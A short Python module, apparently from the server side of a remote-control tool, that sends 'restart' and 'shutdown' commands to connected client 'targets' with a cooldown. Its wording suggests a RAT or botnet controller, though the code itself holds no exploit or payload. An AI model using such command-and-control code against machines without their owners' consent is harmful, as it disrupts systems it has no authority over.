import server_folder.config as config
from socket import error as socket_error
import datetime


def restart(server, targets):
    """
    This would restart all of the selected clients.
    :param server: Server socket object
    :param targets: Client target list
    """
    if datetime.datetime.now() > config.latest_restart_time + datetime.timedelta(minutes=config.POWER_MODULE_COOLDOWN):
        config.latest_restart_time = datetime.datetime.now()
        for target in targets:
            try:
                conn = config.all_connections[target]['data']['socket']
                server.send(conn, 'restart')
            except socket_error:
                print('[!] Connection was lost..')
                config.all_connections.pop(target)  # Delete dead client from the list
    else:
        print('[!] This command is on cooldown. Please wait additional time')


def shutdown(server, targets):
    """
    This would shutdown all of the selected clients.
    :param server: Server socket object
    :param targets: Client target list
    :return:
    """
    if datetime.datetime.now() > config.latest_shutdown_time + datetime.timedelta(minutes=config.POWER_MODULE_COOLDOWN):
        config.latest_shutdown_time = datetime.datetime.now()
        for target in targets:
            try:
                conn = config.all_connections[target]['data']['socket']
                server.send(conn, 'shutdown')
            except socket_error:
                print('[!] Connection was lost..')
                config.all_connections.pop(target)  # Delete dead client from the list
    else:
        print('[!] This command is on cooldown. Please wait additional time')

# Notes:
# Delete custom console + prints before compiling
